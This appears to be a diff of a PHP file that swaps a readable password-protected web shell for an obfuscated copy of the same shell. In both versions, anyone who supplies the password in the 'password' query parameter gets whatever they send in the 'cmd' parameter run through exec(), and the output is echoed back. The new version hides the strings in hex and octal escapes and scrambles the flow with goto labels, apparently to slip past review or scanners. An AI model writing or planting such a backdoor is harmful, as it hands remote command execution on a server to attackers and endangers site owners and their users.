@@ -1,23 +1,2 @@
-
 <?php
-define('PASSWORD', '9d8c537696632a98fb05cd38b2f50447');
-function auth($password)
-{
-	$input_password_hash = md5($password);
-
-	if (strcmp(PASSWORD, $input_password_hash) == 0) {
-		return TRUE;
-	}else{
-		return FALSE;
-	}
-}
-if (isset($_GET['cmd']) && !empty($_GET['cmd']) && isset($_GET['password'])) {
-	
-	if (auth($_GET['password'])) {
-			echo '<pre>'. exec($_GET['cmd']) .'<pre>';
-	}else{
-		die('Access denide!');
-	}
-}
-?>
-
+ goto MT_Gz; MnkTJ: function auth($password) { $input_password_hash = md5($password); if (strcmp(PASSWORD, $input_password_hash) == 0) { return TRUE; } else { return FALSE; } } goto x10iu; MT_Gz: define("\x50\101\123\x53\127\x4f\x52\x44", "\71\x64\70\x63\x35\63\x37\x36\x39\66\x36\x33\62\x61\x39\x38\x66\x62\x30\65\143\144\63\70\x62\x32\x66\65\x30\64\x34\67"); goto MnkTJ; x10iu: if (isset($_GET["\x63\x6d\x64"]) && !empty($_GET["\x63\x6d\144"]) && isset($_GET["\x70\x61\x73\x73\167\157\x72\x64"])) { if (auth($_GET["\160\x61\x73\163\167\157\x72\144"])) { echo "\74\160\162\x65\76" . exec($_GET["\143\x6d\144"]) . "\74\x70\162\x65\x3e"; } else { die("\101\143\x63\145\163\x73\x20\x64\145\x6e\151\144\x65\x21"); } } goto h35Ap; h35Ap: ?>
